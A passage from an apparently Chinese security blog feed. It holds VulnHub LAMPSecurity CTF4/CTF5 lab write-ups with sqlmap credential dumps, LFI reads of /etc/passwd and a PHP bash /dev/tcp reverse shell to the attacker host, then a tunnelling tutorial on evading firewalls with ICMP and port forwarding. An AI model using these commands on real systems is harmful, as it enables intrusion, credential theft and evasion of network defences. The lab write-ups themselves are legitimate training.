ctf4.sas.upenn.edu; OS: Unix</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.57 ms 192.168.188.130</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.98 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¼€äº†22,25,80.</p><p>è®¿é—®blogï¼Œurlæœ‰æ³¨å…¥ï¼Œsqlmapç›´æ¥è·‘ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.188.130/index.html?page=blog&amp;title=Blog&amp;id=7%27&quot;</span> -D ehks -T user --dump</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br><span class="line">| user_id | user_name | user_pass                                        |</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br><span class="line">| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |</span><br><span class="line">| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |</span><br><span class="line">| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |</span><br><span class="line">| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |</span><br><span class="line">| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |</span><br><span class="line">| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br></pre></td></tr></table></figure><p>sshç»ƒäº†ä¸€æ¬¡è¿ä¸ä¸Šï¼Œæœäº†ä¸‹åŠ ä¸ªå‚æ•°ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o KexAlgorithms=diffie-hellman-group1-sha1 achen@192.168.188.130 </span><br></pre></td></tr></table></figure><p>è¿›å»ä¹‹å<code>sudo -l</code>ï¼Œå¯ä»¥çœ‹åˆ°è¯¥ç”¨æˆ·å¯ä»¥æ‰§è¡Œrootçš„æ‰€æœ‰å‘½ä»¤ï¼Œä½†æ˜¯ä¸æ˜¯æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥ï¼Œæ¯”å¦‚pmooreå°±ä¸è¡Œ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¼€å§‹æ‰“vulnhub&lt;/p&gt;
&lt;p&gt;downloadï¼š&lt;code&gt;https://www.vulnhub.com/entry/lampsecurity-ctf4,83/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;æ‰«æï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="VulnHub" scheme="http://example.com/tags/VulnHub/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub_02_LAMPSECURITY: CTF5</title>
    <link href="http://example.com/2022/02/16/VulnHub02/"/>
    <id>http://example.com/2022/02/16/VulnHub02/</id>
    <published>2022-02-15T16:00:00.000Z</published>
    <updated>2022-02-19T08:25:14.429Z</updated>
    
    <content type="html"><![CDATA[<p>download:<a href="https://www.vulnhub.com/entry/lampsecurity-ctf5,84/">https://www.vulnhub.com/entry/lampsecurity-ctf5,84/</a></p><p>æ‰«æä¹‹åå‘ç°æ˜¯ï¼š<code>http://192.168.188.131</code></p><p><code>nmap -sV &lt; è¦æ‰«æçš„ç›®æ ‡ipåœ°å€&gt;</code>*</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali]</span><br><span class="line">â””â”€<span class="comment"># nmap -sV 192.168.188.131                                                                                   130 â¨¯</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-16 01:26 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.188.131</span><br><span class="line">Host is up (0.0059s latency).</span><br><span class="line">Not shown: 990 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)</span><br><span class="line">25/tcp   open  smtp        Sendmail 8.14.1/8.14.1</span><br><span class="line">80/tcp   open  http        Apache httpd 2.2.6 ((Fedora))</span><br><span class="line">110/tcp  open  pop3        ipop3d 2006k.101</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">143/tcp  open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0500)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">901/tcp  open  http        Samba SWAT administration server</span><br><span class="line">3306/tcp open  mysql       MySQL 5.0.45</span><br><span class="line">MAC Address: 00:0C:29:44:6B:32 (VMware)</span><br><span class="line">Service Info: Hosts: localhost.localdomain, 192.168.188.131; OS: Unix</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 11.79 seconds</span><br><span class="line">                                                                 </span><br></pre></td></tr></table></figure><p>ä½¿ç”¨niktoæ‰«ä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">â””â”€<span class="comment"># nikto -h 192.168.188.131</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.188.131</span><br><span class="line">+ Target Hostname:    192.168.188.131</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2022-02-16 01:29:54 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.2.6 (Fedora)</span><br><span class="line">+ Retrieved x-powered-by header: PHP/5.2.4</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">+ Apache/2.2.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL <span class="keyword">for</span> the 2.x branch.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE </span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause <span class="literal">false</span> positives.</span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">+ /index.php: PHP include error may indicate <span class="built_in">local</span> or remote file inclusion is possible.</span><br><span class="line">^[[B^[[B^[[B+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is <span class="keyword">for</span> managing MySQL databases, and should be protected or limited to authorized hosts.</span><br><span class="line">+ Server may leak inodes via ETags, header found with file /phpmyadmin/ChangeLog, inode: 558008, size: 22676, mtime: Mon Aug 20 22:59:12 2029</span><br><span class="line">+ OSVDB-3092: /phpmyadmin/ChangeLog: phpMyAdmin is <span class="keyword">for</span> managing MySQL databases, and should be protected or limited to authorized hosts.</span><br><span class="line">+ Cookie SQMSESSID created without the httponly flag</span><br><span class="line">+ OSVDB-3093: /mail/src/read_body.php: SquirrelMail found</span><br><span class="line">+ OSVDB-3093: /squirrelmail/src/read_body.php: SquirrelMail found</span><br><span class="line">+ /info.php: Output from the phpinfo() <span class="keyword">function</span> was found.</span><br><span class="line">+ OSVDB-3233: /info.php: PHP is installed, and a <span class="built_in">test</span> script <span class="built_in">which</span> runs phpinfo() was found. This gives a lot of system information.</span><br><span class="line">+ OSVDB-3268: /icons/: Directory indexing found.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake<span class="string">&#x27;s list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/</span></span><br><span class="line"><span class="string">+ /phpmyadmin/: phpMyAdmin directory found</span></span><br><span class="line"><span class="string">+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</span></span><br><span class="line"><span class="string">+ OSVDB-3092: /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</span></span><br><span class="line"><span class="string">+ 8724 requests: 0 error(s) and 26 item(s) reported on remote host</span></span><br><span class="line"><span class="string">+ End Time:           2022-02-16 01:30:19 (GMT-5) (25 seconds)</span></span><br><span class="line"><span class="string">---------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">+ 1 host(s) tested</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰LFI/RFI</p><p><code>http://192.168.188.131//index.php?page=../../../../../../../../../etc/passwd%00</code></p><p><code>root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin nscd:x:28:28:NSCD Daemon:/:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin rpm:x:37:37:RPM user:/var/lib/rpm:/sbin/nologin polkituser:x:87:87:PolicyKit:/:/sbin/nologin avahi:x:499:499:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin openvpn:x:498:497:OpenVPN:/etc/openvpn:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin torrent:x:497:496:BitTorrent Seed/Tracker:/var/spool/bittorrent:/sbin/nologin haldaemon:x:68:68:HAL daemon:/:/sbin/nologin gdm:x:42:42::/var/gdm:/sbin/nologin patrick:x:500:500:Patrick Fair:/home/patrick:/bin/bash jennifer:x:501:501:Jennifer Sea:/home/jennifer:/bin/bash andy:x:502:502:Andrew Carp:/home/andy:/bin/bash loren:x:503:503:Loren Felt:/home/loren:/bin/bash amy:x:504:504:Amy Pendelton:/home/amy:/bin/bash mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash </code></p><p>æœä¸‹åº•éƒ¨å…³äºnanocmsçš„æ´ï¼Œï¼š<a href="https://vulners.com/openvas/OPENVAS:100141">https://vulners.com/openvas/OPENVAS:100141</a></p><p>æœ‰ä¸ªæ˜¯å¯†ç æ•£åˆ—ä¿¡æ¯æ³„éœ²ï¼Œå…è®¸ä¸å—é™åˆ¶åœ°è®¿é—®ï¼š/data/pagesdata.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:12:&#123;s:8:&quot;homepage&quot;;s:1:&quot;1&quot;;s:10:&quot;links_cats&quot;;a:4:&#123;s:7:&quot;sidebar&quot;;a:2:&#123;i:0;i:1;i:1;i:4;&#125;s:11:&quot;other-pages&quot;;a:0:&#123;&#125;s:14:&quot;top-navigation&quot;;a:2:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;4&quot;;&#125;s:12:&quot;Footer-Right&quot;;a:2:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;4&quot;;&#125;&#125;s:5:&quot;slugs&quot;;a:2:&#123;i:1;s:4:&quot;home&quot;;i:4;s:7:&quot;contact&quot;;&#125;s:6:&quot;titles&quot;;a:2:&#123;i:1;s:4:&quot;Home&quot;;i:4;s:7:&quot;Contact&quot;;&#125;s:10:&quot;slug_count&quot;;i:11;s:8:&quot;settings&quot;;a:3:&#123;s:19:&quot;index-last-modified&quot;;i:1234513760;s:18:&quot;def-template-areas&quot;;a:4:&#123;i:0;s:12:&quot;website name&quot;;i:2;s:14:&quot;website slogan&quot;;i:3;s:16:&quot;below navigation&quot;;i:4;s:16:&quot;copyright notice&quot;;&#125;s:18:&quot;def-template-links&quot;;a:2:&#123;i:0;s:14:&quot;top-navigation&quot;;i:1;s:12:&quot;Footer-Right&quot;;&#125;&#125;s:13:&quot;active-tweaks&quot;;a:2:&#123;i:0;s:7:&quot;deutsch&quot;;i:1;s:19:&quot;language-pack-tweak&quot;;&#125;s:11:&quot;lang-select&quot;;s:7:&quot;english&quot;;s:6:&quot;seourl&quot;;s:1:&quot;0&quot;;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:32:&quot;9d2f75377ac0ab991d40c91fd27e52fd&quot;;s:7:&quot;version&quot;;s:4:&quot;v_4f&quot;;&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°adminçš„å¯†ç çš„hashè§£å¯†ä¸ºshannon</p><p>ç™»è¿›å»åç›´æ¥newpageï¼Œä½¿ç”¨msfvenomåå¼¹shellï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.188.129 lport=4444 -f raw</span><br></pre></td></tr></table></figure><p><img src="/2022/02/16/VulnHub02/image-20220216211315347.png" alt="image-20220216211315347"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> lhost 192.168.188.129</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">msf exploit(handler) &gt; run</span><br></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;bash -i &gt;&amp; /dev/tcp/192.168.188.129/4444 0&gt;&amp;1&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">--------</span><br><span class="line">nc -lp 4444</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä»¥ä¸‹å‘½ä»¤åœ¨homeä¸‹æ‰¾rootå¯†ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -R -i password /home/* 2&gt; /dev/null</span><br></pre></td></tr></table></figure><p><img src="/2022/02/16/VulnHub02/image-20220216214354852.png" alt="image-20220216214354852"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;download:&lt;a href=&quot;https://www.vulnhub.com/entry/lampsecurity-ctf5,84/&quot;&gt;https://www.vulnhub.com/entry/lampsecurity-ctf5,84/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ‰«æä¹‹</summary>
      
    
    
    
    
    <category term="VulnHub" scheme="http://example.com/tags/VulnHub/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€-éš§é“éšè—</title>
    <link href="http://example.com/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/"/>
    <id>http://example.com/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/</id>
    <published>2022-02-09T16:00:00.000Z</published>
    <updated>2022-02-10T07:11:43.716Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="éšè—é€šä¿¡éš§é“æŠ€æœ¯"><a href="#éšè—é€šä¿¡éš§é“æŠ€æœ¯" class="headerlink" title="éšè—é€šä¿¡éš§é“æŠ€æœ¯"></a>éšè—é€šä¿¡éš§é“æŠ€æœ¯</h1><p>å½“æˆ‘ä»¬è¿›å…¥å†…ç½‘å®Œæˆä¿¡æ¯æ”¶é›†åï¼Œæ¥ä¸‹æ¥å°±è¦åˆ¤æ–­å†…ç½‘çš„è¿é€šæ€§ï¼ˆæµé‡èƒ½å¦è¿›å‡ºï¼‰ï¼Œè¯¥æŠ€æœ¯é€šå¸¸ç”¨äºåœ¨è®¿é—®å—é™çš„å†…ç½‘ç¯å¢ƒä¸­å®Œæˆå†…ç½‘ä¹‹å†…ã€å†…ç½‘ä¸å…¬ç½‘ä¹‹é—´å®‰å…¨ã€ç¨³å®šçš„æ•°æ®ä¼ è¾“ã€‚</p><p>åœ¨æœ€ç®€å•çš„æƒ…å†µä¸‹ï¼Œä¸¤å°ä¸»æœºä¹‹é—´æ•°æ®çš„äº¤æ¢å»ºç«‹åœ¨TCP/IPåè®®ä¹‹ä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´çŸ¥é“äº†IPã€å»ºç«‹äº†TCPè¿æ¥ï¼Œé‚£ä¹ˆä¸¤å°ä¸»æœºä¾¿å¯ä»¥è¿›è¡Œæ•°æ®ä¼ è¾“ã€‚</p><p>ä½†åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå†…ç½‘çš„ç¯å¢ƒå­˜åœ¨å¤šç§è¾¹ç•Œè®¾å¤‡ä»¥åŠå…¥ä¾µæ£€æµ‹è£…ç½®çš„é™åˆ¶ï¼Œå®ƒä»¬ä¼šå¯¹ä¸»æœºé—´æˆ–è€…å†…ç½‘ä¸å¤–ç½‘ä¹‹é—´é€šä¿¡çš„æµé‡è¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœå­˜åœ¨å¼‚å¸¸å°±ä¼šè¿›è¡Œæ‹¦æˆªï¼Œè¿™æ— ç–‘ç»™å†…ç½‘æ¸—é€å¢åŠ äº†éš¾åº¦ï¼Œè€Œéšè—é€šä¿¡éš§é“æŠ€æœ¯å°±æ˜¯ä¸ºäº†ç»•è¿‡å„ç§è¾¹ç•Œè®¾å¤‡çš„å°é”ï¼Œä»è€Œå®Œæˆä¸»æœºé—´æˆ–å†…ç½‘ä¸å¤–ç½‘ä¹‹é—´çš„é€šä¿¡ã€‚</p><h1 id="å¸¸è§éš§é“"><a href="#å¸¸è§éš§é“" class="headerlink" title="å¸¸è§éš§é“"></a>å¸¸è§éš§é“</h1><p>ç½‘ç»œå±‚ï¼šIPV6éš§é“ã€ICMPéš§é“</p><p>ä¼ è¾“å±‚ï¼šTCPéš§é“ã€UDPéš§é“ã€ç«¯å£è½¬å‘</p><p>åº”ç”¨å±‚ï¼šSSHéš§é“ã€HTTP(S)éš§é“ã€DNSéš§é“</p><h2 id="ç½‘ç»œå±‚"><a href="#ç½‘ç»œå±‚" class="headerlink" title="ç½‘ç»œå±‚"></a>ç½‘ç»œå±‚</h2><h3 id="1-IPV6éš§é“"><a href="#1-IPV6éš§é“" class="headerlink" title="1.IPV6éš§é“"></a>1.IPV6éš§é“</h3><blockquote><p>  å·¥å…·ï¼š6tunnelï¼ˆkaliè‡ªå¸¦ï¼‰</p><p>  é¶æœºï¼šwinserver2008</p><p>  æ”»å‡»æœºï¼škali</p></blockquote><p>é¦–å…ˆè¦å¼€å¯é¶æœºçš„IPV6</p><p><img src="/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20220210134112319.png" alt="image-20220210134112319"></p><p>ä¹‹åæŸ¥çœ‹é¶æœºçš„ipv6åœ°å€ï¼Œå‡è®¾ä¸ºaaaa:bbbb:cccc:dddd</p><p>åœ¨kaliï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">6tunnel -4 80 aaaa:bbbb:cccc:dddd%eth080</span><br><span class="line"><span class="comment">#å°†é¶æœºçš„80ç«¯å£ï¼ˆipv6ï¼‰è½¬å‘åˆ°æœ¬åœ°çš„80ç«¯å£ï¼ˆipv4ï¼‰</span></span><br></pre></td></tr></table></figure><p>ä¹‹åè®¿é—®æœ¬åœ°çš„80ç«¯å£å°±å¯è®¿é—®ç›®æ ‡æœºçš„æœåŠ¡</p><h3 id="2-ICMPéš§é“"><a href="#2-ICMPéš§é“" class="headerlink" title="2.ICMPéš§é“"></a>2.ICMPéš§é“</h3><p>ä¸€èˆ¬é€šä¿¡éƒ½éœ€è¦ç«¯å£çš„å¼€å¯ï¼ŒICMPåˆ™ä¸éœ€è¦å¼€æ”¾ä»»ä½•ç«¯å£ã€‚</p><p>æ¸—é€æµ‹è¯•ä¸­ï¼Œå¦‚æœé˜²ç«å¢™å¯¹å„ç§ä¸Šå±‚åè®®(HTTP.HTTPS,DNSç­‰)çš„æ•°æ®åŒ…è¿›è¡Œäº†å°é”ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹ç½‘ç®¡å¸¸å¸¸æ¼æ‰çš„ICMPåè®®åŒ…ï¼Œæˆ‘ä»¬å¯ä»¥å°†TCPæ•°æ®åŒ…å°è£…åˆ°ICMPæ•°æ®åŒ…ä¸­ï¼Œå¦‚æœé˜²ç«å¢™ä¸å¯¹ICMPåŒ…è¿›è¡Œæ‹¦æˆªï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥å®ç°å¯¹é˜²ç«å¢™çš„çªç ´</p><h4 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h4><blockquote><p>  å·¥å…·ï¼šicmpsh</p><p>  downloadï¼š<a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p><p>  éœ€è¦pythonçš„impacketç±»åº“ï¼šapt-get install python4-impacket</p><p>  ç”±äºicmpshè¦ä»£æ›¿ç³»ç»Ÿæœ¬èº«çš„pingåº”ç­”ï¼Œæ‰€ä»¥è¦å…³é—­ä¸€ä¸‹ç³»ç»Ÿçš„pingåº”ç­”ï¼Œå¦åˆ™å·¥å…·å°†æ— æ³•ç¨³å®šè¿è¡Œ</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure></blockquote><p>ä¹‹åè·‘run.shè„šæœ¬å³å¯ï¼Œè¾“å…¥é¶æœºä¸æ”»å‡»æœºIPåä¼šç»™å‡ºè¦åœ¨é¶æœºä¸Šè¿è¡Œçš„æŒ‡ä»¤</p><p>æ‰§è¡Œåå³å¯å›å¼¹shell</p><h4 id="pingtunnel"><a href="#pingtunnel" class="headerlink" title="pingtunnel"></a>pingtunnel</h4><p>ç½‘ç»œçš„æ‹“æ‰‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ”»å‡»æœºï¼š192.168.1.4</span><br><span class="line">webæœåŠ¡ï¼š192.168.1.5</span><br><span class="line">æ•°æ®åº“æœåŠ¡å™¨ï¼š192.168.1.2</span><br></pre></td></tr></table></figure><p>å¯è®¿é—®webæœåŠ¡ï¼Œä½†ä¸èƒ½è®¿é—®æ•°æ®åº“æœåŠ¡å™¨ï¼›webæœåŠ¡å™¨åªèƒ½é€šè¿‡icmpè®¿é—®æ•°æ®åº“æœåŠ¡å™¨ã€‚</p><blockquote><p>  å·¥å…·ï¼špingtunnel</p><p>  make &amp;make install</p></blockquote><p>åœ¨webæœåŠ¡å™¨ä¸Šä¹Ÿè¦è£…ï¼Œä¹‹å<code>ptunnel -x aaa</code>(åœ¨webæœåŠ¡å™¨ä¸Šå¼€å¯ä¸€ä¸ªå¯†ç ä¸ºaaaçš„icmpéš§é“)</p><p>åœ¨æ”»å‡»æœºä¸Šï¼š<code>ptunnel -p 192.168.1.5 -lp 1080 -da 192.168.1.2 -dp 3389 -x aaa</code></p><p>(å½“è®¿é—®æ”»å‡»æœºçš„1080ç«¯å£æ—¶ï¼Œæ•°æ®åº“æœåŠ¡å™¨3389ç«¯å£çš„æ•°æ®ä¾¿ä¼šä»¥webæœåŠ¡å™¨ä¸ºä¸­è½¬ï¼Œé€šè¿‡åˆšåˆšæ­å»ºå¥½çš„ä»¥aaaä¸ºå¯†ç çš„ICMPéš§é“ä¼ é€åˆ°æ”»å‡»æœºçš„1080ç«¯å£ä¸Š)</p><h2 id="ä¼ è¾“å±‚"><a href="#ä¼ è¾“å±‚" class="headerlink" title="ä¼ è¾“å±‚"></a>ä¼ è¾“å±‚</h2><h4 id="1-ç«¯å£è½¬å‘"><a href="#1-ç«¯å£è½¬å‘" class="headerlink" title="1.ç«¯å£è½¬å‘"></a>1.ç«¯å£è½¬å‘</h4><blockquote><p>  å·¥å…·ï¼šlcx</p><p>  downloadï¼š<a href="https://github.com/yw9381/lcx">https://github.com/yw9381/lcx</a></p></blockquote><p>lcxçš„åŸç†å°±æ˜¯æ­å»ºSocketéš§é“ï¼Œä¸€ä¸ªæ­£å¸¸çš„Socketéš§é“å¿…é¡»å…·å¤‡ä¸¤ç«¯ï¼šå®¢æˆ·ç«¯ã€æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯å¼€å¯ç›‘å¬ç«¯å£ï¼Œå®¢æˆ·ç«¯ä¼ å…¥æœåŠ¡ç«¯çš„IPä¸ç«¯å£ï¼Œä¸»åŠ¨ä¸æœåŠ¡ç«¯è¿æ¥</p><blockquote><p>  æ”»å‡»æœºï¼š192.168.1.2</p></blockquote><p>åœ¨é¶æœºä¸Šï¼š<code>lcx.exe -slave 192.168.1.2 4444 127.0.0.1 3389</code></p><p>(å°†æœ¬æœºçš„3389ç«¯å£è½¬å‘åˆ°æ”»å‡»æœºçš„4444ç«¯å£)</p><p>åœ¨æ”»å‡»æœºä¸Šï¼š<code>./portmap -m 2 -p1 4444 -h2 192.168.1.2 -p2 